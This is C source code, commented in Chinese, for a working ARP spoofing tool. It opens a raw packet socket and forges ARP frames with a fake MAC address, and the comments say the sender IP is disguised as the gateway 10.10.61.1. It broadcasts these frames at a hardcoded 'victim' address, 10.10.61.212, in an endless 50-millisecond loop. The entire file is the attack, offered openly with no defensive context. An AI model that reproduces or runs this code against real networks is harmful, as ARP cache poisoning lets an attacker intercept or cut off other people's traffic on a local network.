#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <net/if_arp.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define error_exit(_errmsg_) error(EXIT_FAILURE, errno, _errmsg_)

// ARP 封装需要的一些宏
#define MAC_LEN 6               // 物理地址长度
#define IP4_LEN 4               // IP地址长度
#define GATEWAY "10.10.61.1"    // 网关地址
#define VICTIM "10.10.61.212"   // 被攻击的地址
#define DEV_NAME "enp2s0"       // 本机的设备名

#define BUFF_SIZE 1024          // 通用缓冲区大小

/**
 * 获得网络设备索引号,原始套接字的发送需要
 * @param  devname 设备名
 * @return         成功
 */
int getifindex(const char *devname)
{
    struct ifreq ifreq_buf;
    int sockfd;
    int retval = 0;

    if (-1 == (sockfd = socket(AF_INET, SOCK_DGRAM, 0)))
    {
        retval = -1;
        goto goto_return;
    }

    strcpy(ifreq_buf.ifr_name, devname);

    if (-1 == ioctl(sockfd, SIOCGIFINDEX, &ifreq_buf))
    {
        retval = -1;
        goto goto_return;
    }

    retval = ifreq_buf.ifr_ifindex;

goto_return:
    close(sockfd);
    return retval;
}

/**
 * ARP发送函数, 只用作ARP数据包的封装和发送
 * @param  sockfd     套接字
 * @param  ip4_sender 网关地址
 * @param  ip4_target 目标地址
 * @return            成功
 */
int send_arp(int sockfd, struct in_addr ip4_sender, struct in_addr ip4_target)
{
    struct sockaddr_ll ll_addr;

    // 整个数据帧的封装
    struct frame_ether {
        struct ether_header eth_header; // 以太网头
        struct arphdr arp_header;       // arp头
        unsigned char src_mac[MAC_LEN]; // 源MAC地址,伪造
        unsigned char src_ip[IP4_LEN];  // 源IP地址,伪造成网关
        unsigned char dst_mac[MAC_LEN]; // 目标MAC地址,置空
        unsigned char dst_ip[IP4_LEN];  // 目标IP地址, 被攻击者
    } frame_buff;

    struct sockaddr mac_sender =
    {
        0x08, 0x14, 0x11, 0x22, 0x33, 0x44
    };

    // 填充 ll_addr 结构体
    memset(&ll_addr, 0, sizeof(ll_addr));
    ll_addr.sll_family = AF_PACKET;

    // 将接受方的MAC设置为广播地址,群发:ff:ff:ff:ff:ff:ff
    memset(ll_addr.sll_addr, 0xff, sizeof(ll_addr.sll_addr));

    ll_addr.sll_halen = MAC_LEN;
    ll_addr.sll_ifindex = getifindex(DEV_NAME);

    // 填充整个ARP数据帧
    
    // 填充以太网头
    memset(frame_buff.eth_header.ether_dhost, 0xff, MAC_LEN);
    memcpy(frame_buff.eth_header.ether_shost, mac_sender.sa_data, MAC_LEN);
    frame_buff.eth_header.ether_type = htons(ETHERTYPE_ARP);

    // 填充ARP头
    frame_buff.arp_header.ar_hrd = htons(ARPHRD_ETHER);
    frame_buff.arp_header.ar_pro = htons(ETHERTYPE_IP);
    frame_buff.arp_header.ar_hln = MAC_LEN;
    frame_buff.arp_header.ar_pln = IP4_LEN;
    frame_buff.arp_header.ar_op = htons(ARPOP_REQUEST);

    // 填充ARP数据
    memcpy(frame_buff.src_mac, mac_sender.sa_data, MAC_LEN);
    memcpy(frame_buff.src_ip, &ip4_sender.s_addr, IP4_LEN);
    memset(frame_buff.dst_mac, 0, MAC_LEN);
    memcpy(frame_buff.dst_ip, &ip4_target.s_addr, IP4_LEN);

    // 发送
    if (-1 == sendto(sockfd, &frame_buff, sizeof(frame_buff), 0, (struct sockaddr *)&ll_addr, sizeof(ll_addr)))
    {
        error_exit("sendto");
    }
    return 0;
}

int main(int argc, const char **argv)
{
    int sockfd;
    int index;
    struct in_addr sender;
    struct in_addr target;

    // 以原始套接字的方式打开套接字
    if (-1 == (sockfd = socket(AF_PACKET, SOCK_RAW, 0)))
    {
        error_exit("socket");
    }

    // 转换网关地址和被攻击地址
    inet_aton(GATEWAY, &sender);
    inet_aton(VICTIM, &target);

    while (1)
    {
        send_arp(sockfd, sender, target);
        usleep(50000);
    }

    close(sockfd);
    return 0;
}
